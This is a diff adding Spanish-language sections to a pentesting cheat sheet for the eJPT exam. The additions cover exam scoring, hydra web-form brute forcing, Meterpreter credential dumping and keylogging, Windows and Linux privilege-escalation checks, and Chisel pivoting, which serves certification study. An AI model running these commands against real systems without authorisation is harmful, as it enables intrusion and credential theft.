@@ -6,13 +6,41 @@ Resumen de todos los comandos del vault, organizado por fases de pentesting.
 
 ## 0. METODOLOGÍA DE EXAMEN eJPT
 
-1. **Lee TODAS las preguntas antes de tocar cualquier herramienta** — las preguntas te dicen qué buscar.
-2. **Reconocimiento inicial** (one-liners de arranque):
+### Scoring — cómo se aprueba y cómo NO perder puntos
+- **35 preguntas**, opción múltiple + dinámicas, basadas en tus hallazgos. **48h** (la mayoría termina en 4–12h).
+- Necesitas **70% global** Y además **cada dominio** por separado tiene su propio mínimo. Si fallas un dominio, no apruebas aunque el global dé ≥70%:
+
+| Dominio | Peso | Mínimo | Qué cubre |
+|---|---|---|---|
+| Assessment Methodologies | 25% | **90%** | Recon pasivo/activo, OSINT, scanning, footprinting |
+| Host & Network Auditing | 25% | **80%** | Enumeración de servicios, vuln assessment, Wireshark |
+| Host & Network Pentesting | 35% | **70%** | Metasploit, brute force, **pivoting**, privesc, post-expl |
+| Web Application Pentesting | 15% | **60%** | SQLi, XSS, fuzzing, file upload, dir traversal |
+
+> **Cómo funciona el "restar puntos":** no hay penalización por responder mal — cada pregunta correcta suma dentro de su dominio. El riesgo real es **dejar preguntas sin responder**. **Responde TODO** (no dejar en blanco) y verifica cada respuesta contra tu evidencia antes de enviar.
+> **Flags dinámicas (dato oficial):** son únicas por sesión, pero **si reseteas el lab NO necesitas volver a actualizar las respuestas de flags** que ya enviaste — la plataforma las asocia al valor de tu sesión al momento de enviarlas. (El quiz y el lab están abiertos a la vez las 48h.)
+> - **Assessment (90%)** es el más exigente: casi no puedes fallar. Son preguntas de enumeración/recon → sé meticulosa escaneando todos los puertos y servicios.
+> - **Pivoting es obligatorio** (aparece en ~100% de los exámenes) y pesa dentro del 35%. Sin pivoting bien hecho no llegas al mínimo de Pentesting.
+
+### Flujo de arranque
+1. **Lee la Letter of Engagement** (alcance, restricciones, reglas) — 10 min.
+2. **Lee TODAS las preguntas antes de tocar cualquier herramienta** — las preguntas te dicen qué buscar.
+3. **Reconocimiento inicial** (one-liners de arranque):
    ```bash
    netdiscover -r 192.168.x.x/24
    nmap -Pn -sS -sV -sC -T4 -p- -O -oN scan_result.txt <target_ip>
    ```
-3. **Red layout:** normalmente hay una **DMZ** + una **red interna** (alcanzable solo vía *pivoting* desde un host dual-homed).
+4. **Red layout:** normalmente hay una **DMZ** + una **red interna** (alcanzable solo vía *pivoting* desde un host dual-homed).
+
+### Datos del escenario real (de la Letter of Engagement)
+- **Cliente:** Syntex Dynamics. Black-box pentest. Arrancas conectada a la **DMZ** desde un **jumpbox Kali**.
+- **Scope:** la DMZ + **cualquier red interna que logres alcanzar**. Hay que *identificar las redes internas, pivotar, enumerar sus hosts y comprometerlos*. El diagrama oficial muestra hasta 2 redes internas (es solo guía, no la config real).
+- **Todas las redes son /24.** Tienes que **descubrir el routing y las direcciones de red** encontrando el pivot point que las interconecta.
+- **"No es un CTF"** (lo dicen literal): piensa como pentest → enumera todo antes de explotar.
+- **Cualquier ataque/herramienta/técnica está permitida** (SQLMap, Metasploit automático, etc. — no hay restricciones tipo OSCP).
+- **Entorno SIN internet:** ni la Kali ni los targets tienen salida a internet. La investigación (Google, CVEs, exploits) la haces desde el navegador de **tu equipo host**, y el código de exploit lo pasas a la Kali por el **clipboard de Guacamole** (`Ctrl+Alt+Shift` abre el menú → pega en el área "Clipboard"). linPEAS/winPEAS, Metasploit, searchsploit y rockyou YA están en la Kali — no necesitas descargar nada.
+- **Wordlists:** passwords → `/usr/share/wordlists/rockyou.txt`. **Regla de oro:** si un brute-force tarda +20-30 min, estás con la wordlist equivocada.
+- **Guarda TODO en tu host** (CherryTree/Obsidian): resetear el lab borra la Kali. Responde las preguntas mientras avanzas.
 
 ### Tips clave del examen
 - Leer todas las preguntas primero.
@@ -54,6 +82,13 @@ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name |
 ### Shodan (OSINT de infraestructura)
 ```bash
 shodan host <IP>
+```
+
+### Passive Recon — emails, hosts, metadatos (dominio Assessment 90%)
+```bash
+whois inlanefreight.com                 # Registrante, nameservers, fechas
+host inlanefreight.com                   # Resolución A/MX rápida
+theHarvester -d inlanefreight.com -b all # Emails, subdominios, hosts (OSINT)
 ```
 
 ---
@@ -560,6 +595,29 @@ python3 -m openvasreporting -i <report>.xml -f xlsx
 
 ---
 
+## 8b. ANÁLISIS DE TRÁFICO — Wireshark / TShark
+
+> Dominio Auditing (80%). A veces los **flags o credenciales en texto plano** están en una captura `.pcap` que te dan, o en tráfico que capturas. Domina los filtros básicos.
+
+```bash
+# TShark (CLI, rápido para el examen)
+tshark -r captura.pcap                                  # Leer pcap
+tshark -r captura.pcap -Y "http.request.method==POST"   # Solo POSTs (logins)
+tshark -r captura.pcap -Y "ftp || telnet"               # Protocolos en claro
+tshark -i eth0 -f "port 21"                              # Capturar en vivo FTP
+```
+**Filtros clave de Wireshark (barra de display filter):**
+```
+http.request            # Peticiones HTTP
+ftp                     # Credenciales FTP en claro (USER/PASS)
+telnet                  # Credenciales telnet
+tcp.port == 80
+ip.addr == 10.10.10.10
+```
+> **Truco:** `Follow > TCP Stream` sobre un paquete reconstruye toda la conversación (ahí aparecen user/pass y flags). Buscar strings con Ctrl+F → "Packet bytes" → "password".
+
+---
+
 ## 9. EXPLOTACIÓN / GANAR ACCESO INICIAL
 
 ### MSFVenom — Generar payloads
@@ -941,7 +999,17 @@ hydra -L user.list -P password.list rdp://<IP> -t 4 -W 3
 hydra -l <user> -P password.list ftp://<IP>
 # SMB
 hydra -L user.list -P password.list smb://<IP>
+# MySQL / RDP
+hydra -l root -P password.list mysql://<IP>
+hydra -l administrator -P password.list rdp://<IP>
+# Formulario web HTTP POST (login.php) — F=texto que aparece al FALLAR
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
+  "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+# Formulario GET
+hydra -l admin -P password.list <IP> http-get-form \
+  "/login:user=^USER^&pass=^PASS^:F=Invalid"
 ```
+**Clave:** `^USER^`/`^PASS^` son los marcadores; tras los dos puntos finales va `F=<string de fallo>` (o `S=<string de éxito>`). Captura el POST con Burp para copiar los nombres exactos de los campos.
 
 ### NetExec (antes CrackMapExec)
 ```bash
@@ -1017,6 +1085,25 @@ cat <archivo>    # Leer archivo
 upload / download
 ```
 
+**Credential dumping avanzado (requiere SYSTEM):**
+```bash
+load kiwi                 # Carga mimikatz dentro de meterpreter
+creds_all                 # Todas las credenciales (texto plano, hashes, kerberos)
+lsa_dump_sam              # Dump de la SAM
+```
+**Token impersonation (robar identidad de otro usuario logueado):**
+```bash
+load incognito
+list_tokens -u                          # Ver tokens disponibles
+impersonate_token "NT AUTHORITY\\SYSTEM"
+```
+**Screenshot / keylogger:**
+```bash
+screenshot
+keyscan_start
+keyscan_dump
+```
+
 ### Verificar privesc en Linux
 ```bash
 sudo -l                           # Ver permisos sudo
@@ -1024,9 +1111,34 @@ id                                # Ver grupos (¡grupo docker = root!)
 find / -perm -4000 -type f 2>/dev/null  # Archivos SUID
 find / -perm -u=s -type f 2>/dev/null   # Equivalente (otra sintaxis)
 find / -group operator 2>/dev/null      # Archivos por grupo no estándar
+getcap -r / 2>/dev/null           # Capabilities (cap_setuid, cap_dac_read_search...)
+cat /etc/crontab; ls -la /etc/cron.*    # Cron jobs (scripts escribibles = root)
 ss -tlnp                          # Puertos internos
 cat /etc/gshadow                  # Ver miembros de grupos
+uname -a                          # Kernel → searchsploit linux kernel <ver>
 ```
+> **Enumeración automática:** sube `linpeas.sh` (Linux) o `winPEASx64.exe` (Windows) y léelo entero — resalta en rojo/amarillo los vectores. Es lo primero que debes correr tras conseguir shell.
+
+### Verificar privesc en Windows
+```cmd
+whoami /priv                      # ¡SeImpersonate/SeAssignPrimaryToken = Potato attacks!
+whoami /groups                    # Grupos del usuario
+systeminfo                        # Build/parches → buscar exploits de kernel
+net user                          # Usuarios locales
+net localgroup administrators     # Quién es admin
+sc query state=all                # Servicios (buscar binpath modificable)
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer   # AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer   # (ambos =1 → MSI como SYSTEM)
+findstr /si password *.txt *.xml *.ini    # Credenciales en archivos
+dir /s /b *flag* *pass*                    # Buscar flags/credenciales
+```
+```powershell
+# WinPEAS — enumeración automática (subir primero)
+.\winPEASx64.exe
+# accesschk (Sysinternals) — servicios escribibles por el usuario
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+```
+**Clave:** si `whoami /priv` muestra **SeImpersonatePrivilege** (típico en cuentas de servicio IIS/MSSQL), usa **PrintSpoofer / GodPotato / JuicyPotato** para saltar a `NT AUTHORITY\SYSTEM`. Si no tienes shell admin, desde Meterpreter prueba `getsystem` y `local_exploit_suggester`.
 
 ### SUID → Root (abuso GTFOBins)
 ```bash
@@ -1132,6 +1244,19 @@ proxychains crackmapexec smb 192.168.0.0/24
 ```
 **Clave:** `route`/`autoroute` sirve solo dentro de Metasploit; para herramientas externas (nmap, cme, evil-winrm) necesitas `socks_proxy` + `proxychains`, o `portfwd` para un puerto puntual.
 
+```bash
+# Chisel — túnel SOCKS reverso (alternativa a Metasploit, sin sesión meterpreter)
+# En el ATACANTE (Kali):
+./chisel server -p 8000 --reverse
+# En la VÍCTIMA (host dual-homed, subir el binario primero):
+./chisel client <IP_KALI>:8000 R:socks
+# Luego en /etc/proxychains4.conf → socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 192.168.0.50
+
+# SSH dynamic (SOCKS) si tienes credenciales SSH en el pivote
+ssh -D 9050 user@<IP_pivote>      # Proxy SOCKS en 127.0.0.1:9050
+```
+
 ### Credenciales en .env / archivos de configuración
 ```bash
 cat /var/www/html/.env
@@ -1225,6 +1350,24 @@ loot                       # Ver loot
 sessions -l                # Listar sesiones activas
 sessions -i 1              # Interactuar con sesión 1
 ```
+
+---
+
+## SI TE ATASCAS — Árbol de decisión rápido
+
+> No gastes más de **1 hora** en un mismo punto. Si te bloqueas, recorre esta lista antes de pedir ayuda:
+
+1. **¿Enumeré TODO?** Vuelve al nmap: `-p-` (todos los puertos), `-sU --top-ports 20` (UDP), `--script vuln`. El 90% de los bloqueos son un puerto/servicio que no viste.
+2. **¿Probé credenciales en TODOS lados?** Lo que encuentres (SMTP, .env, config, DB) pruébalo en SSH/SMB/FTP/RDP/MySQL/web. La **reutilización de credenciales** es el patrón #1 del examen.
+3. **¿Revisé accesos anónimos?** FTP `anonymous`, SMB sesión nula (`-N`), NFS `showmount -e`, SNMP `public`.
+4. **¿Busqué el exploit por versión?** `searchsploit <servicio> <versión>` y búsqueda en Google del banner exacto. Si un exploit falla 2–3 veces, **no es el camino** — prueba otro vector.
+5. **¿Es un host dual-homed?** `ip a` / `ipconfig /all` tras cada shell. Si tiene 2 interfaces → **hay que pivotar** a la red interna (autoroute + socks_proxy / chisel).
+6. **¿Hice privesc?** Tras cada shell: `sudo -l`, SUID, `getcap`, cron (Linux) / `whoami /priv`, servicios, AlwaysInstallElevated (Windows). Sube linPEAS/winPEAS.
+7. **¿La máquina falló?** Si el escaneo no termina o el editor se traba, **reinicia el lab** — pero anota TODO antes en tu HOST (la Kali se borra al reiniciar). Las flags dinámicas ya enviadas NO hay que re-actualizarlas tras el reset.
+8. **¿El brute-force tarda demasiado?** Si pasa de **20-30 min, estás usando la wordlist equivocada** — el ataque correcto tarda un par de minutos. Cambia de wordlist (usa `rockyou.txt` para passwords).
+9. **¿Hay una captura .pcap o Wireshark?** Flags/credenciales suelen esconderse en tráfico FTP/HTTP/telnet en claro.
+
+**Antes de enviar:** ninguna pregunta en blanco (no hay penalización por fallar, sí por no responder).
 
 ---
 
